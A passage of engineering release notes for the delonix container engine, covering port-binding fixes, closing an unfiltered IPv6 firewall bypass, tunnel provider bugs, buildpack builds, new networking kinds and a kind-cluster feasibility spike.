  address (loopback only) came back on `0.0.0.0`, exposed to the entire LAN, because the shell that
  ran the `start` had the variable exported. And it is the engine's own hint (`vm reach`) that
  taught you to export it.

In both cases **rc=0, no warning**, and `net ingress ls` printing the same line before and
after: `51070:80` and `51072:80` were identical bytes on disk with opposite reach.

**The fix is a single function**, `delonix_sdn::normalize_publish_spec`, applied at the
boundary: the stored spec is always `addr:hostPort:contPort/proto`. Idempotent, because of
the 2nd pass of the `--net <network>` re-exec. Welcome side effect: `fmt_ports` already
said that **with an explicit address the address is a FACT** and printed it, so `container ls`
now shows `0.0.0.0:55070->5070/udp` without a single new line of code — in the column read
precisely to decide what is exposed. A spec **without** an address now means «a record predating
this version», and only there does the omission of `0.0.0.0` remain.

**The reconciler had to move in the same step, or you'd trade one bug for a worse one.**
`ports` is a compared and hot field, and its diff plans a `Replace` — which on a container is
destroy and recreate. A manifest `8080:80` against a record `127.0.0.1:8080:80/tcp` was
eternal drift. Hence `comparable_ports`, ONE function for `desired` and `actual`: two
copies of this normalization are how the two sides start to disagree. It normalizes also on
READ, so a legacy record doesn't read as drift after the upgrade; and a manifest that
NAMES a different address is still genuine drift, which is the case that could not be
swallowed.

**The port probes were TCP-only** (`can_bind_host_port`, `host_port_busy`): a UDP
publication was checked against TCP, blind by construction, and the conflict only showed up
inside the slirp as opaque JSON. They now receive a `delonix_sdn::Proto` — an enum and not
a `&str`, so that the `sctp` the CRI can emit and a typo get **refused** at this
boundary instead of being probed as TCP. Proven live and by accident: port 5070/UDP
on this host really is in use by a `python3`, and the new probe named it **with the
transport** (`port 5070/udp is already in use … by python3`).

**Three defects in `vm reach` caught by the same pass** — the first would have been
caused by the normalization if it hadn't been looked at: it read the host port with
`p.split(':').next()`, which on a spec with an address returns `127.0.0.1` and matches nothing
(the SAME trap `fmt_ports` documents having paid); it ran `ss -tln`, so a UDP
publication was invisible to it, which is exactly the case of whoever goes to see why a
SIP doesn't answer from inside a VM; and the fix hint taught the env var, the path
that doesn't survive a `start`.

**The `--help` of `net ingress publish` didn't document the `hostIp:` form** — it accepted it and
stayed silent, with three examples and none with an address, while `container run -p`
documents both. It was that silence that nearly led someone to conclude there was only
loopback and to switch paths (a UDP proxy, MetalLB) for a capability that already existed.

**Gate**: the section «publish: the bind address is RECORDED and survives a start» of
`scripts/e2e.sh`, verified by the house rule — **10/10 with the fix, 6/10 without it**,
with the four failures being exactly the four facets of the bug. It had to be the CYCLE
(`publish` → `stop` → `start`): each isolated step returns 0 even with the defect, and a
check by rc would be green over it.

### Block 0 of plan 33 (v0.37.1) — the unfiltered IPv6 path

Phase 0 discovery in `docs/discovery/33_GAPS_ENCONTRADOS.md`; notes in
`docs/releases/archive/v0.md`, section v0.37.1. This block exists because the discovery found a
COMPLETE bypass of the policy model, and no other work made sense before closing it.

**The SDN assigned a ULA IPv6 to each container (`fd00:<o2>::<o3>:<o4>`, derived from the IPv4) and
the entire firewall is `table ip`.** Second data path, zero policy. Reproduced
live: with the firewall DENYING in IPv4, the same target answered 200 on port 80 via the
ULA. It bypassed `ingress`/`egress`, `policy deny`, namespace isolation,
`kind: Dependency` and the L4 guard — all `table ip`. No privilege, and discoverable with
a `ping -6 ff02::1%eth0` (enumerates all the bridge's neighbors in one pass).

**Fixed with TWO independent layers, on purpose**: (1) `disable_ipv6` inside the
container's netns on `attach` — removes the ULA *and* the link-local, without depending on anything from the
host; (2) `table ip6 dlxing` with `forward policy drop` in the holder — catches a PRIVILEGED
container that remounts `/proc/sys` rw and re-enables v6. Layer 2 depends on
`bridge-nf-call-ip6tables`, which a host may not have — that is why it is the second and not
the only one. Nothing was lost: there is no v6 uplink (slirp runs without `--enable-ipv6`) and the
internal resolver only answers A records.

**RF-NET-02**: chain `fwguard` at `forward priority -20` (before `fwdeny` -10,
`fwcont` -5 and the policy 0) with `169.254.0.0/16` and `127.0.0.0/8` denied
unconditionally. The rule's counter proved it live (`packets 4 bytes 240`). The
host loopback was already closed by slirp's `--disable-host-loopback`; the rule
exists because that is a flag one regression away.

**Noisy escape hatches** (same form as `DELONIX_FORWARD_POLICY=accept`):
`DELONIX_ENABLE_IPV6=1` and `DELONIX_ALLOW_LINK_LOCAL=1`, both validated live.

**Trap caught while writing the test, worth remembering**: the first version of the ordering
test compared the TEXTUAL POSITION of the chains in the ruleset, and then the priority VALUES
of all of them — both wrong. Priority in nftables only orders chains of the
SAME hook; comparing `-20` with the `-100` of the `nat prerouting` chain means
nothing. The test only became worth anything when it restricted the comparison to
`hook forward`.

**HOT hardening of already-running containers** (`infra::disable_ipv6_live`,
called by `net netns up`): the refusal enters on `attach`, which only covers new
containers. Telling the others to restart would be the wrong answer in THIS engine — the dataplane does not
belong to the process lifecycle, and that is the fundamental difference from docker
(`container update` already swaps ports, volumes and networks with the PID unchanged). The sweep
enters the live netns and turns off their v6 in place. Validated live against containers
created BEFORE the fix, with the bypass open: same PID (`771209` before and after),
uptime counting, v6 at zero, bypass closed, IPv4 intact.

**Why `nsenter` and not a control-socket verb** (the first form tried):
the case this exists to solve is the in-place upgrade, where the new binary is
installed and the OLD holder keeps running with all the containers attached to it
(see `stale_holder_message`). An old holder does not know a verb added today —
the control command would fail exactly in the scenario that matters. Entering its
namespaces from the host works with any holder binary.

### `tunnel expose --provider pinggy` with no URL (v0.16.1)

Real bug report (host kaeso-sys-01): `delonix net tunnel expose --provider pinggy --local-port 8181`
always answered "URL not yet confirmed", never a real URL. **Root cause, confirmed by
running the real `ssh` by hand, outside the binary**: `free.pinggy.io` (the endpoint DOCUMENTED by
pinggy) has geo-DNS — from this host it always resolved to a broken regional PoP
(`br.free.pinggy.io` → `lin.br.1.a.pinggy.click`) that accepts the connection, allocates the `-R0`, and closes
seconds later without printing anything. A 2nd behavior also reproduced: under `setsid`/detached
(exactly how `spawn_and_capture` launches the process), `ssh` sometimes doesn't even exit after the
server closes — it hangs. Neither "process died" nor "process alive" isolates on its own which
of the two failures happened. **Fixed**: `spawn_pinggy` tries `free.pinggy.io` first (kept
as the default — it is the documented one); if the poll produces no URL, it kills the process if still
alive (never leaves 2 tunnels per `TunnelRecord`) and tries `a.pinggy.io` once (pinggy's own
endpoint, not documented separately, but which connected successfully under the same conditions).
`spawn_and_capture` also leaves the poll as soon as the process dies, instead of always waiting the
15s. Validated live: real public URL returned (`https://….free.pinggy.net`), local `curl` AND
to the public URL both gave 200 — the tunnel forwards real traffic, it is not just log-scraping.

### `tunnel expose` simplified — positional port, optional `provider` (BREAKING, no alias)

User request: `delonix net tunnel expose --name <n> --provider pinggy --local-port
<port>` was the most verbose command of this group for the most common case (pinggy, with no own
name) — three flags for a single number that matters. `net tunnel` is not on the
"Stable" list of `docs/cli-stability.md`, so the cut is clean, with no alias, like the precedent of
v0.30.0.

- **`local_port` became POSITIONAL** — `delonix net tunnel expose 8080`. The `--local-port`
  flag no longer exists; whoever uses it gets "unrecognized argument", never silence.
- **`--provider` gained a DEFAULT of `pinggy`** (it is the only one that needs no extra binary nor
  account — see the module's doc-comment) and went from a free `String` to a `clap::ValueEnum`
  (`TunnelProvider`), only on the CLI side — the manifest's `TunnelSpec.provider` stays `String`,
  because a `kind: Tunnel` is not clap and gains nothing from the enum. It gives autocomplete for FREE (the
  `clap_complete` dynamic-completions engine already knows how to enumerate the `possible values` of a
  `ValueEnum`, without needing `ArgValueCandidates`) and `[possible values: pinggy, ngrok,
  cloudflare]` appears on its own in `--help`.
- **`-p`/`-n` as shortcuts** for `--provider`/`--name`.
- **`--name` gained autocomplete of the ALREADY existing tunnels** (`ArgValueCandidates::new(super::
  complete::tunnels)`, the same completer `describe`/`rm` already used) — useful for re-exposing with
  the same name (reconfigures instead of creating a second one), not just for new names.
- Result: `delonix net tunnel expose --name kitamba-saurimo-85 --provider pinggy --local-port
  8080` becomes `delonix net tunnel expose 8080 --name kitamba-saurimo-85` (or, with no own
  name, just `delonix net tunnel expose 8080`).
- Updated the examples in `manual_entries.rs`, `docs/gen.py` and `examples/tunnel.yaml` — none
  was left with the old syntax (the `os_exemplos_invocam_o_comando_que_documentam` test only confirms
  that the example NAMES the command, not that the syntax is valid; the real validation was live, with the
  binary, including the dynamic-completions engine with `_CLAP_COMPLETE_INDEX`/`COMPLETE=bash`).

### `tunnel expose --token`/`--insecure-skip-tls-verify` — cloudflare NAMED tunnel, and 3 bugs found live

Direct request following the simplification above: paid-account token (it already existed for pinggy/ngrok,
but cloudflare rejected it entirely) + TLS. Unlike the rest of this module, this work
was validated against REAL downloaded binaries (`cloudflared v2026.8.2`, `ngrok v3.39.11`) —
none was installed on this host, and the real `--help` + live tests against a local self-signed HTTPS
server are what decided the final form, not documentation read over lightly.

- **`insecureSkipTlsVerify` (`TunnelSpec`/`--insecure-skip-tls-verify`)** — TLS of the LOCAL BACKEND
  (self-signed on `localhost:<localPort>`), never of the public URL (that is always a real provider
  cert). For `cloudflare` it turns on `--no-tls-verify` + swaps `http://` for `https://` in `--url`;
  for `ngrok` it only swaps the address to `https://localhost:<port>` (confirmed in `ngrok http
  --help`: `--upstream-tls-verify` exists to REQUIRE verification, i.e. the default is already
  permissive for a local backend — there is no "skip" flag to pass); documented no-op for
  `pinggy` (forwards raw TCP, never inspects what is behind). **Validated live, both
  directions**: a real `cloudflared tunnel --url https://localhost:<port>` against a self-signed
  HTTPS server returned 200 WITH `--no-tls-verify` and 502 WITHOUT — the flag is not decorative.
- **`cloudflare` + `--token`/`--token-secret` runs an already-created NAMED tunnel**
  (`cloudflared tunnel run --token <token> --url <origin>`) — confirmed in the real `--help` that
  `--token`/`--url`/`--no-tls-verify` are all accepted by `tunnel run`, and that `--url` only takes
  effect when the tunnel has no remote ingress configured yet (documented by cloudflared
  itself), so it is harmless to always pass it. **No call to the Cloudflare API** — it only
  runs the binary with the token the operator already has (dashboard/`cloudflared tunnel create`); creating
  a NEW tunnel via API remains the documented follow-up it already was. `hostname` is now accepted
  (only with a token) as an INFORMATIONAL field — the route itself lives in the dashboard, delonix doesn't read it.
  **Confirmed with an invalid token**: it fails in 0.4s with "Provided Tunnel token is not valid.",
  not with a crash nor a hang — proof that the constructed argv is accepted by the real binary; the path
  with a VALID token was not exercised (no Cloudflare account available in this sandbox).

**3 pre-existing bugs found live by this work, all fixed**, none caused
by the earlier simplification — they had just never been reached by a real test before:

1. **`provider=ngrok` was 100% broken against any ngrok v3 agent.** `spawn_ngrok` passed
   `--web-addr <port>` to vary the local API per tunnel — `ngrok http --web-addr ...` answers
   **`unknown flag`** on a real v3 binary (confirmed; the local API is FIXED at `127.0.0.1:4040`,
   with no flag nor config key to change it — `web_addr:` in a `--config` YAML gives "field not found").
   Fixed: the port is always `4040` (`NGROK_WEB_ADDR`), and since there can be only ONE, a 2nd
   `ngrok` tunnel alive is refused with a clear reason (`other_alive_ngrok`) instead of two agents
   fighting over the same port silently.
2. **`pid_alive` confused a zombie with "alive"** — it only read `/proc/<pid>`, and a child that died and was never
   `waitpid`-ed still has an entry in `/proc` (State `Z`) while the process THAT CREATED IT
   stays alive — **proven with a repro in C** before touching the Rust. This made the very
   reason for existing of `!pid_alive` in the poll loop of `spawn_and_capture` useless (the v0.16.1 fix
   for pinggy): with an invalid cloudflare token, `cloudflared` died in <1s and even so the
   `expose` waited the full 15s. Fixed with an opportunistic `waitpid(pid, WNOHANG)` BEFORE the
   `/proc` — reaping a child of ours that already died, a harmless no-op (ECHILD) for a pid that is not
   our child (the process's own pid, tested). **Reverted and confirmed that the new test
   fails without the fix** (repo rule); and confirmed live: `cloudflared crashed right at startup`
   in 0.4s instead of a `timeout 15` killing the process.
3. **`poll_ngrok_api` didn't look at the pid** — even with `pid_alive` fixed, this
   SEPARATE loop (after `spawn_and_capture` had already returned) kept hammering the local API the full
   15s even with the agent already confirmed dead. It gained the same `if !pid_alive { break }`
   that `spawn_and_capture` already had since v0.16.1. **Validated live**: `ngrok` without
   `--authtoken` (a real auth failure, confirmed in the log) went from a `timeout 8` killing the process
   to a 1.4s response.

**Files touched**: only `cmd/tunnel.rs` (schema+CLI+the 3 fixes) + `pt.po` + `manual_entries.rs`
+ `docs/gen.py`/`docs/comandos/tunnel.html` (regenerated) + `docs/schema/v1/delonix.json`
(regenerated — `insecureSkipTlsVerify` is a new field of the published schema) + `examples/tunnel.yaml`.
## `kind: App` — Cloud Native Buildpacks wired to a real build path (ADR-0035)

`crates/adapters/delonix-oci` already shipped three pure, tested modules for CNB
(`buildpack.rs`, `detect.rs`, `internal_registry.rs`) — **without ONE single
caller outside their own tests**, confirmed by an exhaustive `git grep`
before writing any code. The one real problem that
kept them from being wired up: the CNB lifecycle `creator` exports to an OCI
REGISTRY, and `internal_registry.rs` was loopback-only (`127.0.0.1`) — a
builder container lives in its own netns and cannot reach the host's
loopback. It was not lack of effort, it was a structural
incompatibility that nothing had hit yet, because nothing was calling either side.

**The fix**: the disposable registry now lives in a `kind: Network`
of its own per build, reached by the builder container through its **SDN
IP** — not through the engine's internal DNS, which was the first attempt and failed
live: the CNB lifecycle's registry client (go-containerregistry) only
picks HTTP on its own for an RFC1918 address or a literal `localhost:<port>`;
any other name, internal DNS included, means HTTPS and the `creator` refuses
(`server gave HTTP response to HTTPS client`), with no flag whatsoever in the
`/cnb/lifecycle/creator -h` of this version (0.21.18) to work around it. Since this
engine's SDN subnets are always RFC1918, pointing at the registry's own IP
satisfies that heuristic for free — no config file, no
`--insecure-registry`, no new authentication. It is also published to the HOST
(`-p <free-port>:5000`) so the `delonix` process can pull the built
image back into the LOCAL `ImageStore` after the build — two
different reaches, a single container.

**The build runs via `exec`, not as the container's main process.** A
`-d` container without `--restart` does not have its exit code captured
reliably (the engine is not the process's real parent) — the builder container is born
with `sleep infinity` as a placeholder, and `CnbPlan`'s `creator_args()`
runs via `runtime::exec`, which returns a real code (the same mechanism that
`container exec` already uses). A failed build leaves the containers/network standing for
inspection (`container logs <builder>`), the same idiom as `compose up` when
a `depends_on` fails.

```yaml
apiVersion: artifact.delonix.io/v1alpha1
kind: App
metadata: { name: shop }
spec:
  source: .          # relativo ao CWD, mesma convenção do build.context de kind: Image
  builder: auto      # "auto" | "heroku" | uma imagem builder própria (exige runImage)
  image: shop:latest
```

**`desired().converges = false`, always** — the same honesty that
`kind: Image` already uses for a BUILT image (never PULLED): there is no build
cache, `apply` always rebuilds, and reporting drift would make
`--detailed-exitcode` return 2 forever in any repo that declares an
`App`. `ownable: false` for the same reason as `Image` — the result is a
shared, content-addressed cache, with no stack owner.

**`get`/`describe`/`delete apps` do not exist, on purpose.** Unlike
`Image` (whose CAS is a real list, independent of any
manifest), an `App` has no registry of its own — its build produces
EXACTLY one image, and nothing else persists the fact that an `App` ever
named it. Once built, it is indistinguishable from any other tagged
image: `image ls`/`image describe <tag>` are what see the real state. Giving it
a generic verb would require a new registry that this slice does not add.

**To do, documented in ADR-0035**: own buildpack composition
beyond automatic detection, a cache shared BETWEEN different apps
(`cache_volume` is already per-app and survives reapplications of the SAME app),
authentication for the disposable registry (it is not reachable outside its
own build's network), and direct publishing to a remote registry (v1 always stays
in the local `ImageStore`, like any other Kind).

**Validated live end to end, and three real bugs only validation
found** — none visible from reading the code, all three with a regression test
or a written rationale, see ADR-0035 for the detail: (1) `source_dir` was never
canonicalized — the default `.` survived the `--net <custom-network>` re-exec
(a different process, different CWD) and the builder's `/workspace` ended up
mounting `/`; fixed right after the directory check. (2)
`CNB_PLATFORM_API` is MANDATORY — `/cnb/lifecycle/creator` refuses to
run without it; pinned to `"0.7"`, the default that BOTH known families
(Paketo jammy-base and heroku:24) declare for the SAME lifecycle (0.21.18).
(3) the `output_ref` by internal DNS (this ADR's original form) does not
work — see the section above; fixed to the registry's SDN IP.
**A finding apart, real, and DELIBERATELY not fixed here**: the
`paketobuildpacks/builder-jammy-base` has 91 layers, and the
`lowerdir=` string of this engine's overlay for that image reaches ~8.8 KB — more
than double what a classic `mount(2)` accepts in the `data` argument (the
`glibc`/kernel silently truncate instead of refusing, and the path cut in
half gives exactly the observed `ENOENT`). Reproduced with a simple `container
run` of the same image, with no `App` code involved at all — it is a
limitation of `mount_overlay_if_marked` (`delonix-runtime`, shared by
ALL containers), not of `App`, and the proper fix (`fsopen`/
`fsconfig`/`fsmount`, with no size ceiling) deserves its own ADR.
`builder: heroku` (23 layers, ~2 KB) does not hit this gap and was the path
proven end to end: it detected node+Procfile, installed Node 24.20.0,
exported, published over plain HTTP by IP, pulled back, and the final image
**actually ran and responded on the declared port** — not just `rc=0`.

## `kind: NetworkAccessRule` — the incremental primitive B4 was missing (ADR-0028)

B4 of the CLI restructuring plan promised to collapse `net ingress`/`net
egress` (17 leaves) into a declarative Kind. Measured twice
(`docs/releases/archive/v0.md`, section v0.68.0) and confirmed once more in this session: it only reached
4 leaves, because `net ingress allow`/`net egress allow` are **incremental**
(they add a rule, keeping the others) and the one declarative Kind that
existed for the firewall — `kind: FirewallPolicy`, also reachable as
`NetworkPolicy` (both spellings point at `cmd::kinds::FIREWALL_POLICY`)
— **replaces the entire state of one direction** on each apply
(`apply_fw_doc`). Two `FirewallPolicy` for the same (target, direction) are
refused on purpose — see the section above — because a replace cannot
express "these two together" without one silently deleting the other.

`kind: NetworkAccessRule` enters ALONGSIDE `FirewallPolicy`, it does not replace it:
one INCREMENTAL firewall rule per document. Measured before writing
code: the engine ALREADY resolves the whole mechanism — `add_rule` (the "last
command wins" semantics of `net ingress`/`net egress`) is a pure Rust mutation
over `Vec<FwRule>`, followed by an `nft -f` that rebuilds the entire chain from
scratch (`delonix-sdn/src/infra.rs::do_firewall`). There is no per-rule nft
primitive to build — the only thing missing was ACCOUNTING: nothing let
a document applied and removed independently retract only ITS
contribution from a shared list. The one Kind that already accumulated,
`kind: Dependency`, works around this by fusing all sibling documents into a single
`FirewallPolicy` at `load` (`dependency.rs::lower_dependencies`) — it only
works within ONE pass of `stack apply`, and the module itself admits
that removing ONE Dependency alone does not retract its effect.

**The mechanism**: `FwRule` gained `origin: Option<String>` — the name of the
`NetworkAccessRule` document that wrote that rule. A document's apply
finds-and-replaces only the rule with ITS origin on the target container,
leaving all the others (from other documents, from the imperative `net ingress`/`net
egress`, or from a `FirewallPolicy`) untouched. Removing the
document retracts only that rule.

**A fix needed in the SAME commit**: `apply_fw_doc`'s
`fw.rules.retain(|r| r.dir != dir)` deleted EVERYTHING in the direction, including
rules with an `origin` — a `FirewallPolicy` applied over a target that also
had `NetworkAccessRule` rules deleted them silently while
reporting success, the SAME class of bug that the refusal of two
`FirewallPolicy` already exists to prevent, except across different Kinds where
that refusal does not see it. It became `retain(|r| r.dir != dir || r.origin.is_some())`
— `FirewallPolicy` still replaces only the ownerLESS rules.

**No new CLI verb.** It is reached as `kind: Dependency` already is —
via `delonix apply -f`/`delonix stack apply`, which dispatch by Kind. Collapsing
the `net ingress`/`net egress` surface onto this Kind is a
**separate, future** decision (the plan's own §5 already asked to "re-measure B4 when
an incremental NetworkPolicy exists" — this is the primitive that was missing for
that re-measurement, not the re-measurement itself).

**A fix to this section, found in LIVE validation before the merge, not
after**: the 1st version of `stamp` wrote `STACK_LABEL`/`MANAGED_BY` into the
labels of the TARGET container itself — and that made a `stack apply --prune` of the
stack owning only the RULE delete a completely unrelated container (created by
hand, or by another stack). Measured live, not deduced: two
`NetworkAccessRule` on the same container, `--prune` removing one of them, and the
whole container vanished. **Fixed before the merge** with
per-origin annotations of its own (`delonix.io/networkaccessrule-owner/<name>`,
`network_access_rule.rs`'s `owner_key`/`last_applied_key`) that NEVER touch the
container's labels — ownership of a rule and ownership of the container that
receives it are distinct things, and only the rule's stamp lives there. `actual()`
also started sweeping the WHOLE store (not just the current manifest's docs),
otherwise a document removed from the manifest never appeared as a candidate for
`Delete` for `--prune` — the very reason this Kind exists.

## `kind: Service` — discovery by selector, round-robin by DNS, no VIP (ADR-0032, 2026-09-05)

> **Since 2026-10-12 "no VIP" applies only to `type: DNS`** (the omission): `type: VirtualIP` gives an
> L4 address with readiness — see "kind: Service type VirtualIP" further below.

Closes the Kind that was missing for the CLI restructuring plan's "12 operable
Kinds". Full design in
`docs/adr/0032-service-kind-dns-round-robin.md`; this section records what
changed to implement it and what live validation confirmed.

- **Selection by label, no new matching mechanism**: `matches_labels`
  (`delonix-net-rules`, pure, fail-closed — an empty selector selects
  NOTHING) compares `spec.selector.matchLabels` against `Container.labels`. It is the
  same primitive that `ADR-0024` designed for `FirewallPolicy` and which
  remains to be built — intended for the two Kinds to end up sharing the
  same function, not two copies diverging.
- **Multi-record DNS, not VIP**: `build_dns_index` gained a pass over
  `service_list()` (a new registry in `infra.rs`, same pattern as `RouteDef`)
  that resolves `matchLabels` against the live containers of the SAME scan
  pass (no 2nd disk read) and stores the set of IPs under the service's DNS
  key. `dns_resolve_multi_for` (new, alongside the usual `dns_resolve_for` —
  the 1-IP consumers do not change shape) only resolves the fully
  qualified name (`<svc>.<ns>.delonix.internal`, no short form) and
  rotates the set by an atomic counter on each query. `handle_dns` tries
  this path first for `QTYPE_A` and answers with one `A` record per
  backend; a failure (zero backends) falls to the usual path, which stays
  bit-for-bit unchanged.
- **Namespace isolation, inherited from the existing model**: same
  namespace or the service being in `default` (the "public" namespace — see
  "Namespace isolation" above); the rest is NXDOMAIN. There is no equivalent of
  `Dependency` to extend this to a Service in another namespace — if it ends up being
  needed, it is a follow-up.
- **`ownable: true`, but without touching the target's labels** — the same care that
  `NetworkAccessRule` needed (see the section above), only simpler here:
  unlike a firewall rule, a `Service` NEVER binds to a
  container that is not its own — ownership stays entirely in the Service's own registry,
  with no stamp whatsoever on the selected container.
- **`spec.port` is always the CONTAINER's port**, the same convention that
  `net ingress allow` already uses (post-DNAT) — there is no host or VIP port,
  because there is no VIP.

**Wiring that `KindFacts` alone does NOT cover — discovered by the test
battery, not by reading code.** Adding a new Kind touches SEVERAL
tables that nobody derives from `cmd/kinds.rs`, each with its own gate:
`reconcile.rs::hot_fields` (without it, changing `port` always planned `Replace`
instead of `Update`); `stack.rs::converge_and_stamp`'s central arm (without it,
the `hot_fields` fix alone still fell into `other => Err("no live update
path")`); `complete.rs::NAMESPACE_SOURCES` (the test
`every_namespaced_kind_declares_a_source` failed until `Service` gained
`Store(ns_from_services)`); `schema.rs::TYPED_KINDS` (a list SEPARATE from the
`match` of schema generation — `todo_kind_conhecido_tem_schema_ou_dica`
failed until `Service` entered it); and the published schema itself
(`docs/schema/v1/delonix.json`, regenerated and verified to change ONLY what
`ServiceSpec`/`ServiceSelector` add). It is the same lesson the `KindFacts`
table already documents in its own doc-comment — a classifier is only worth
what something consults — except here they are five different tables, each
discovered by a failing test, not by grep.

**Validated live** (`DELONIX_ROOT` isolated, release binary of this
commit): a selector matching 2 of 3 containers (the third, with another
label, is left out); a real `nslookup` inside an `other` container
returning BOTH of the service's `A` records; namespace isolation in both
directions (`teamA` reaches its own Service, a third namespace does not —
but does reach a Service in `default`, the designed exception); an empty selector
warning and applying successfully (`rc=0`, `NXDOMAIN` on resolution);
hot port update (`stack apply` reports "updating 1 field(s)
live", not a `Replace`); `stack plan --detailed-exitcode` with no differences
after an unchanged apply; `delete services` removing the registry and DNS
answering `NXDOMAIN` immediately after. **Not validated**: a client that
resolves once and keeps a long connection is not rebalanced mid-flight — it is the
limitation named in the ADR itself, common to any DNS-based balancing.

## Addressable identity of Kinds with no registry of their own (B1, 2026-08-31)

`NetworkRoute` and `NetworkPolicy`/`FirewallPolicy` have no document name
persisted anywhere — the registry (when it exists) only knows the PAIR or the
(target, direction), never the `metadata.name` someone wrote in the manifest
(the same reason as the `origin` that `NetworkAccessRule` had to invent, see
above). This mattered little while only the reconciler (`stack plan`/
`apply`) needed to address them — but B1 of the CLI restructuring plan
(`docs/discovery/52_CLI_PLANO_MIGRACAO.md`) required wiring generic `get`/`describe`/
`delete` to these two Kinds, and a generic verb receives a NAME.

- **`NetworkRoute`**: `<from>-><to>` (`netroute::route_name`/
  `split_route_name`) — it was already the identity that `stack plan`/`stack ls`
  printed, it just became also what `describe`/`delete networkroutes`
  accept.
- **`NetworkPolicy`**: `<target>/<direction>` (e.g.: `web/ingress`,
  `firewall::split_policy_name`) — new, because `FirewallPolicy` had never
  needed to print its own identity anywhere before.
  `get networkpolicies` (`firewall::list_all_policies`) also gained, along the
  way, the listing that was missing: today `net ingress ls`/`net egress ls`
  answer only for THEIR direction, one at a time — nothing combined the two per
  container in a single table. `describe`/`delete networkpolicies` reuse
  the `list_rules`/`clear_dir` that `net ingress ls <container>`/`net ingress
  clear <container>` already used — zero new rendering, zero new mechanism.

In both cases: **no new native CLI subcommand**. `network route
describe`/`net ingress describe` still do not exist — only the generic
verb was wired, the same pattern that `kind: Dependency`/
`kind: NetworkAccessRule` already followed.

## Kind-mode cluster without Docker — investigation (GO/NO-GO)

Request: `delonix cluster` in `kind` mode (without `kubeadm`) working **without Docker installed** —
`delonix` would replace Docker/Podman as the `kind` backend. Before investing in the Docker
compatibility shim (large — emulating Go templates, `network create`, `run` with
`--publish`/`--tmpfs`/`--restart`/`--cgroupns`, `logs -f`), we did: (1) empirical investigation of the
real surface that `kind` requires of a backend, (2) 2 bugs fixed in `delonix image pull`
that blocked any test, (3) a validation spike — does the `kindest/node` image (systemd +
nested containerd) even boot under our isolation model?

### Captured surface (reference for the shim phase)

Empirical investigation (not supposition): a real `docker` wrapped in a wrapper that logs each
invocation, with a real end-to-end `kind create cluster` — **52 invocations captured**.
Commands used by a "docker" backend: `info --format {{json .}}` (+ variants `-f {{.Driver}}`,
`--format '{{json .SecurityOptions}}'`, `-f {{json .DriverStatus }}`), `ps -a --filter
label=io.x-k8s.kind.cluster=<n> --format {{.Names}}`, `inspect --type=image <ref>`, `pull <ref>`,
`network ls --filter=name=^kind$ --format={{.ID}}`, `network inspect bridge -f {{ index .Options
"com.docker.network.driver.mtu" }}`, `network create -d=bridge -o
com.docker.network.bridge.enable_ip_masquerade=true -o com.docker.network.driver.mtu=1500 --ipv6
--subnet <cidr> kind`, `run --name <n> --hostname <n> --label io.x-k8s.kind.role=... --privileged
--security-opt seccomp=unconfined --security-opt apparmor=unconfined --tmpfs /tmp --tmpfs /run
--volume /var --volume /lib/modules:/lib/modules:ro -e KIND_EXPERIMENTAL_CONTAINERD_SNAPSHOTTER
--detach --tty --label io.x-k8s.kind.cluster=<n> --net kind --restart=on-failure:1 --init=false
--cgroupns=private --publish=127.0.0.1:<port>:6443/TCP -e KUBECONFIG=... <image>`, `logs -f
<n>`, `inspect --format {{ index .Config.Labels "io.x-k8s.kind.role"}} <n>`, `exec --privileged
[-i] <n> <cmd>` (repeated for `cat`/`mkdir`/`cp /dev/stdin`/`kubeadm init`/`kubectl ...`),
`inspect -f {{range .NetworkSettings.Networks}}{{.IPAddress}},{{.GlobalIPv6Address}}{{end}} <n>`,
`inspect --format {{ with (index (index .NetworkSettings.Ports "6443/tcp") 0) }}{{ printf "%s\t%s"
.HostIp .HostPort }}{{ end }} <n>`, `rm -f -v <n>`.

The Go templates used by `kind` are a **finite and known** set (captured above) — the shim
phase can emulate them by **exact string matching**, with no Go template engine in Rust.

### 2 bugs fixed in `delonix image pull` (`crates/adapters/delonix-oci/src/registry.rs`)

1. **`parse_reference` did not handle `repo:tag@digest`** (the combined format, used by the
   `kindest/node:v1.34.0@sha256:...` reference itself) — the `@` branch cut the reference without first
   stripping the tag from the `repo` side, producing a malformed manifest URL. Regression
   tests: `parses_repo_tag_and_digest_combined`, `parses_repo_tag_and_digest_combined_com_registo_explicito`.
2. **A 120s timeout, too short** in `registry_client`/`pull_from_registry_with_creds` —
   `kindest/node` has layers of several hundred MB; `reqwest` cut the body read
   mid-stream, reported as `"error decoding response body"` (it is not a parsing error, it is an
   interrupted read). Raised to 600s, aligned with `push_to_registry`/`push_oci_artifact`.

Confirmed with a real smoke test: `delonix image pull kindest/node:v1.34.0@sha256:...` completes
in ~2min (before, it always failed, on both bugs).

### GO/NO-GO spike: `container run --privileged` — result: **NO-GO in this v1**

An unexpected finding even before the spike: the engine **already has** dedicated cgroup2
delegation logic for Kind nodes (`setup_node_cgroup_ns` in `crates/adapters/delonix-linux/src/lib.rs`), activated
when `--privileged` + an `io.x-k8s.kind.*` label is present — work undocumented
before this session. To exercise it, a `--label KEY=VAL` flag (repeatable) was added to
`delonix container run` (`bins/delonix-runtime-bin/src/cmd/container.rs`) — there was
no way to set labels via CLI, only internally. It stayed as a permanent feature
(it exposes a field that already exists in `Container`, it is not Kind-specific).

With the label and `--privileged`, `kindest/node` **crashes always at the same point**, very early — right
after `INFO: detected cgroup v1` in the log of the image's own entrypoint (which runs on a host
that is 100% cgroup v2, confirmed via `stat -fc %T /sys/fs/cgroup` → `cgroup2fs`). The crash reproduces
identically under 3 different conditions:

1. `--privileged` without the Kind label (falls into the generic `--privileged` path).
2. `--privileged` + Kind label, rootless session without systemd delegation (engine warns: "rootless WITHOUT
   cgroup delegation").
3. The same, but wrapped in `systemd-run --user --scope -p Delegate=yes` (delegation requested
   explicitly) — **it does not change the result**.
4. Even with `command` overridden to `sleep infinity` — it isolates nothing, because `--entrypoint`
   does not exist in the CLI today: `compose_command` always keeps the image's `ENTRYPOINT`
   (`/usr/local/bin/entrypoint /sbin/init`) and only the tail changes, so the `kind` script runs
   anyway.

**Root cause not isolated with 100% confidence** (needs the next session): the log shows
"detected cgroup v1" — a misdetection, since the host is v2-only — and the script dies right after,
silently (no stack trace; `Container` also does not store an exit code today, a gap to
fix). Most likely hypothesis: `/sys/fs/cgroup/cgroup.controllers` is not visible/valid
from inside our container's mount+userns at the moment the `kind` detection script
runs, leading it down a legacy cgroup v1 path that then fails against a v2-only kernel. To
confirm: it needs an `--entrypoint` override in the CLI to run the
`kindest/node` entrypoint manually with `set -x`, or to copy/edit the script for instrumentation.
